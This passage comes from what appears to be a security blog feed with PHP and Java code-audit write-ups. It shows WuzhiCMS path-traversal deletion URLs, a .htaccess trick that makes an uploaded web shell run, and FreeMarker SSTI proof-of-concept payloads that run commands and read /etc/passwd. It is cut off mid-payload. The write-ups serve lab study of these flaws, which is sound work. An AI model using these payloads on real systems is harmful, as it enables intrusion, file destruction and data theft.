class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在D盘下放一个1.txt文件</p><p>网站www目录路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:/phpstudy_pro/WWW/wuzhicms/www/uploadfile<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=attachment&amp;f=index&amp;_su=wuzhicms&amp;v=del&amp;url=http://localhost/wuzhicms/www/uploadfile/../../../../../1.txt<br></code></pre></td></tr></table></figure><p>执行后可以看到1.txt文件顺利被删除</p><p><img src="/img/wuzhicms/w16.png"></p><p>在D盘文件目录中也可以看到是被删除的</p><h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><p>www&#x2F;api&#x2F;uc.php</p><p><img src="/img/wuzhicms/w17.png"></p><p><img src="/img/wuzhicms/w18.png"></p><p>可以将uc_note类中的方法名传入action中调用方法，此类中有更改用户名，更改用户密码，删除用户等方法</p><p>此文件是可以访问的</p><p>构造url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/api/uc.php?action=deleteuser&amp;ids=2<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w19.png"></p><p>显示无效请求</p><h4 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h4><p>搜索file_put_contents关键字时发现</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;/r/n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看是否有方法调用，方法中$data是否能作为可控变量</p><p>全局搜索关键字set_cache</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><p>set方法调用了此函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>            <span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$show_dialog</span> = <span class="hljs-number">1</span>;<br>            <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br>            <span class="hljs-variable">$setting</span> = &amp;<span class="hljs-variable language_">$this</span>-&gt;_cache;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$setting</span>[<span class="hljs-string">&#x27;show_mode&#x27;</span>])) &#123;<br><span class="hljs-variable">$setting</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;show_mode&#x27;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;watermark_enable&#x27;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;watermark_pos&#x27;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;watermark_text&#x27;</span>=&gt;<span class="hljs-string">&#x27;www.wuzhicms.com&#x27;</span>);<br><span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$setting</span>);<br>&#125;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;set&#x27;</span>, M);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到我们传入setting的值即可</p><p>访问url抓取数据包</p><p><img src="/img/wuzhicms/w20.png"></p><p>有先前的set_cache方法可知，文件在cache&#x2F;_ cache_目录下，通过此数据包可以看到watermark的名称</p><p><img src="/img/wuzhicms/w21.png"></p><p>可以确定数据上传后保存在caches&#x2F;<em>cache</em>&#x2F;attachment.YGzFh.php路径下</p><p>修改数据包</p><p><img src="/img/wuzhicms/w22.png"></p><p>顺利上传</p><p><img src="/img/wuzhicms/w23.png"></p><p>由于是缓存文件，重启服务器就会失效</p><h4 id="后台文件上传-未成功"><a href="#后台文件上传-未成功" class="headerlink" title="后台文件上传(未成功)"></a>后台文件上传(未成功)</h4><p><a href="https://www.freebuf.com/articles/web/328241.html">文件上传之.htaccess的一些技巧 - FreeBuf网络安全行业门户</a></p><p>在寻找功能点时发现管理中心-&gt;管理会员-&gt;上传头像有文件上传</p><p>抓包查看路由</p><p><img src="/img/wuzhicms/w06.png"></p><p>找到控制代码</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;index.php -&gt;h5upload()方法</p><p><img src="/img/wuzhicms/w07.png"></p><p>发现是一个黑名单验证</p><p>跟进filename方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filename</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$_exts</span> =  <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;asp&#x27;</span>,<span class="hljs-string">&#x27;jsp&#x27;</span>,<span class="hljs-string">&#x27;jspx&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;aspx&#x27;</span>,<span class="hljs-string">&#x27;asa&#x27;</span>,<span class="hljs-string">&#x27;cs&#x27;</span>,<span class="hljs-string">&#x27;cgi&#x27;</span>,<span class="hljs-string">&#x27;js&#x27;</span>,<span class="hljs-string">&#x27;dhtml&#x27;</span>,<span class="hljs-string">&#x27;xhtml&#x27;</span>,<span class="hljs-string">&#x27;vb&#x27;</span>,<span class="hljs-string">&#x27;exe&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;pthml&#x27;</span>,<span class="hljs-string">&#x27;cdx&#x27;</span>,<span class="hljs-string">&#x27;cer&#x27;</span>);<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>,PATHINFO_EXTENSION));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$_exts</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-variable">$rand_str</span> = <span class="hljs-title function_ invoke__">random_string</span>(<span class="hljs-string">&#x27;diy&#x27;</span>, <span class="hljs-number">6</span>,<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>);<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;YmdHis&#x27;</span>).<span class="hljs-variable">$rand_str</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$files</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现并没有禁止.htaccess后缀文件上传</p><p>尝试上传图片马再解析</p><p>ps：这里黑名单绕过上传php文件是不可以的，之前在安装说明处看到uploadfile文件下的php文件是禁止运行的</p><p>抓包上传一句话木马</p><p><img src="/img/wuzhicms/w08.png"></p><p>可以看到是没有文件内容检测和MIME检测的，成功上传</p><p>上传.htaccess文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;FilesMatch <span class="hljs-string">&quot;/.png&quot;</span>&gt;<br>  SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w09.png"></p><p>同样可以看到是成功上传的</p><p>但是上传后是无法按照预想中执行的，文件上传之后被重命名无法更改，但是apache智慧查找.htaccess并执行</p><p>并且执行.htaccess文件需要apache httpd.conf文件中AllowOverride值为All，默认是none，这个要看运气</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>翻看目录弄清楚结构，找到控制器</li><li>安装系统查看使用的依赖，模板</li><li>判断正常的传值，参数关系，路由关系</li><li>搜索关键字，找敏感函数，查看是否有可控变量，查看是否有利用点(是否有控制器中方法调用，能传参)</li></ol>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMS</tag>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的SSTI</title>
    <link href="/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/"/>
    <url>/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/</url>
    
    <content type="html"><![CDATA[<h2 id="FreeMarker-SSTI"><a href="#FreeMarker-SSTI" class="headerlink" title="FreeMarker SSTI"></a>FreeMarker SSTI</h2><h3 id="FreeMarket基本语法"><a href="#FreeMarket基本语法" class="headerlink" title="FreeMarket基本语法"></a>FreeMarket基本语法</h3><h4 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h4><p><a href="http://freemarker.foofun.cn/dgui_template_valueinsertion.html">插值 - FreeMarker 中文官方参考手册 (foofun.cn)</a></p><p>插值的使用格式是： <code>$&#123;expression&#125;</code>，这里的 <code>expression</code> 可以是所有种类的表达式(比如 <code>$&#123;100 + x&#125;</code>)。</p><p>插值是用来给表达式插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在文本区(比如 <code>&lt;h1&gt;Hello $&#123;name&#125;!&lt;/h1&gt;</code>) 和字符串表达式(比如 <code>&lt;#include &quot;/footer/$&#123;company&#125;.html&quot;&gt;</code>)中。</p><p>需要注意的是：如果插值在文本区 (也就是说，不在字符串表达式中)，如果 <code>escape</code> 指令起作用了，那么将被插入的字符串会被自动转义。</p><h4 id="FTL指令"><a href="#FTL指令" class="headerlink" title="FTL指令"></a>FTL指令</h4><p><a href="http://freemarker.foofun.cn/dgui_template_directives.html">指令 - FreeMarker 中文官方参考手册 (foofun.cn)</a></p><p>使用&lt;# 指令 &gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">eg. &lt;#local name=value&gt;<br></code></pre></td></tr></table></figure><h3 id="FreeMarker-SSTI-成因与攻击面"><a href="#FreeMarker-SSTI-成因与攻击面" class="headerlink" title="FreeMarker SSTI 成因与攻击面"></a>FreeMarker SSTI 成因与攻击面</h3><p>SSTI 的攻击面是模板引擎的渲染，要让 Web 服务器将 HTML 语句渲染为模板引擎，前提是要先有 HTML 语句。</p><p>将 HTML 语句放到服务器上有两种方法：</p><ul><li>1、文件上传 HTML 文件。</li><li>2、若某 CMS 自带有模板编辑功能(常见)</li></ul><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里使用Drunkbaby的漏洞项目：</p><p><a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity">JavaSecurityLearning&#x2F;JavaSecurity at main · Drun1baby&#x2F;JavaSecurityLearning (github.com)</a></p><p>构造payload</p><p>freemarker.template.utility.Execute类中存在命令执行方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>此项目没有写漏洞入口，所以利用时只能将payload直接插入.ftl中</p><p><img src="/img/ssti(java)/ssti01.png"></p><p>成功执行</p><p><img src="/img/ssti(java)/ssti02.png"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>下一个断点在 <code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>，开始调试</p><p> <code>createView(String viewName, Locale locale)</code> 方法，用于创建视图对象(View)，它根据逻辑视图名的前缀，判断应该创建哪种类型的视图：重定向、转发，或默认处理方式。</p><p>在此处下断点是因为MVC 加载流程是从视图解析器到模板引擎，createView-&gt;loadView()-&gt;buildView()，buildView()方法开始有模板引擎参与</p><p><img src="/img/ssti(java)/ssti03.png"></p><p>参考此文章：<a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></p><p>如果对代码结构以及其中的类和方法了解不够透彻，可以直接在代码最后一步下断点，此漏洞是在命令执行方法处(freemarker&#x2F;template&#x2F;utility&#x2F;Execute.class类的exec方法下断点)，查看调用栈，判断触发ftl风险代码的调用栈从 哪里开始，再逐步分析</p><p>下断点后可以看到触发ftl风险代码的调用栈是从FreeMarkerview类的processTemplate方法开始的</p><p><img src="/img/ssti(java)/ssti04.png"></p><p>根据调用栈跟进代码执行流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span>:75, Execute (freemarker.template.utility)<br>_eval:62, MethodCall (freemarker.core)<br><span class="hljs-built_in">eval</span>:101, Expression (freemarker.core)<br>calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)<br>accept:63, DollarVariable (freemarker.core)<br>visit:334, Environment (freemarker.core)<br>visit:340, Environment (freemarker.core)<br>process:313, Environment (freemarker.core)<br>process:383, Template (freemarker.template)<br></code></pre></td></tr></table></figure><p>在开始处下断点进行调试</p><p><img src="/img/ssti(java)/ssti05.png"></p><p>processTemplate-&gt;process()-&gt;visit()-&gt;pushElement()-&gt;element.accept()-&gt;getChildBuffer()-&gt;write()</p><p>process() 方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。</p><p>在 process() 方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。</p><p>在读取到每一条 freeMarker 表达式语句的时候，会二次调用 <code>visit()</code> 方法，</p><p><img src="/img/ssti(java)/ssti06.png"></p><p>而 visit() 方法又调用了 element.accept()，</p><p><img src="/img/ssti(java)/ssti07.png"></p><p>此处代码执行十分复杂，，建议直接根据刚才所看调用栈跟进函数更加清晰明了，不要一直动态调试步入</p><p>根据调用栈转到DollarVariable类accept方法，可以看到调用了calculateInterpolatedStringOrMarkup方法</p><p><img src="/img/ssti(java)/ssti08.png"></p><p>跟进calculateInterpolatedStringOrMarkup方法，该方法做的业务是将模型强制为字符串或标记</p><p><img src="/img/ssti(java)/ssti09.png"></p><p>跟进eval方法，可以看到eval函数对constantValue的值做了简单的判断，判定值为空后跟进 <code>this._eval()</code><img src="/img/ssti(java)/ssti10.png"></p><p>一般的 <code>_eval()</code> 方法只是将 evn 获取一下,如下图</p><p>这是通过DollarVariable类accept方法-&gt;eval方法-&gt;_eval方法</p><p><img src="/img/ssti(java)/ssti16.png"></p><p>但是这里的element的值是图中所示，可以从此处开始动态调试</p><p><img src="/img/ssti(java)/ssti11.png"></p><p>append会调用assign类中的append方法做了一系列基础判断，先判断 <code>namespaceExp</code> 是否为 null，接着又判断 <code>this.operatorType </code>是否等于 65536</p><p><img src="/img/ssti(java)/ssti12.png"></p><p>看到此处获取valueEXP，跟进eval方法</p><p><img src="/img/ssti(java)/ssti13.png"></p><p>eval函数中判断constantValue值为空后，跟进_eval方法</p><p>经过一系列复杂的代码可以看到 <code>targetMethod</code> 目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类</p><p><img src="/img/ssti(java)/ssti15.png"></p><p>此时这一个语句相当于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> targetMethod.exec(argumentStrings);<br><span class="hljs-comment">// 等价于</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> freemarker.template.utility.Execute.exec(argumentStrings);<br></code></pre></td></tr></table></figure><p>而这一步并非直接进行命令执行，而是先把这个类通过 <code>newInstance()</code> 的方式进行初始化。</p><p>命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图</p><p><img src="/img/ssti(java)/ssti17.png"></p><p>至此，漏洞代码分析结束。</p><p>ai了一下_eval代码的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplateModel <span class="hljs-title function_">_eval</span><span class="hljs-params">(Environment env)</span> <span class="hljs-keyword">throws</span> TemplateException &#123;<br>    <span class="hljs-type">TemplateModel</span> <span class="hljs-variable">targetModel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.target.eval(env);<br></code></pre></td></tr></table></figure><p>定义一个 <code>_eval</code> 方法，返回一个 <code>TemplateModel</code>（FreeMarker 中的通用模型类型）。</p><p>调用 <code>this.target.eval(env)</code> 解析出当前要执行的目标对象（可能是方法或变量），并赋值给 <code>targetModel</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (targetModel <span class="hljs-keyword">instanceof</span> TemplateMethodModel) &#123;<br>    <span class="hljs-type">TemplateMethodModel</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> (TemplateMethodModel) targetModel;<br></code></pre></td></tr></table></figure><p>如果目标是一个模板方法（<code>TemplateMethodModel</code>），就将其强制类型转换为 <code>targetMethod</code>。</p><p>此段代码会判断element中的值是方法还是参数，对应传给不同变量，以确保命令的正确拼接</p><h3 id="FreeMarker-SSTI-的攻防二象性"><a href="#FreeMarker-SSTI-的攻防二象性" class="headerlink" title="FreeMarker SSTI 的攻防二象性"></a>FreeMarker SSTI 的攻防二象性</h3><p>现在使用的poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;Calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>这是 FreeMarker 的内置函数 new 导致的，下面简单介绍一下 FreeMarker的两个内置函数—— <code>new</code> 和 <code>api</code></p><h4 id="内置函数-new"><a href="#内置函数-new" class="headerlink" title="内置函数 new"></a>内置函数 new</h4><p>可创建任意实现了 <code>TemplateModel</code> 接口的 Java 对象，同时还可以触发没有实现 <code>TemplateModel</code> 接口的类的静态初始化块。<br>以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 <code>TemplateModel</code> 接口的 <code>freemarker.template.utility.JythonRuntime</code> 和<code>freemarker.template.utility.Execute</code></p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p><code>value?api</code> 提供对 value 的 API（通常是 Java API）的访问，例如 <code>value?api.someJavaMethod()</code> 或 <code>value?api.someBeanProperty</code>。可通过 <code>getClassLoader</code>获取类加载器从而加载恶意类，或者也可以通过 <code>getResource</code>来实现任意文件读取。<br>但是，当<code>api_builtin_enabled</code>为 true 时才可使用 api 函数，而该配置在 <strong>2.3.22 版本</strong>之后默认为 false。</p><ul><li>由此我们可以构造出一系列的 bypass PoC</li></ul><p>POC1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(<span class="hljs-string">&quot;ClassExposingGSON&quot;</span>)&gt; <br>&lt;#assign field=clazz?api.getField(<span class="hljs-string">&quot;GSON&quot;</span>)&gt; <br>&lt;#assign gson=field?api.get(<span class="hljs-literal">null</span>)&gt; <br>&lt;#assign ex=gson?api.fromJson(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; <br>$&#123;ex(<span class="hljs-string">&quot;Calc&quot;</span><span class="hljs-string">&quot;)&#125;</span><br></code></pre></td></tr></table></figure><p>POC2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure><p>POC3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="hljs-keyword">new</span>()&gt;&lt;<span class="hljs-meta">@value</span>&gt;<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>POC4</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign ex=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; ex(<span class="hljs-string">&quot;Calc&quot;</span>) &#125;<br></code></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign is=object?api.class.getResourceAsStream(<span class="hljs-string">&quot;/Test.class&quot;</span>)&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign uri=object?api.class.getResource(<span class="hljs-string">&quot;/&quot;</span>).toURI()&gt;<br>&lt;#assign input=uri?api.create(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list <span 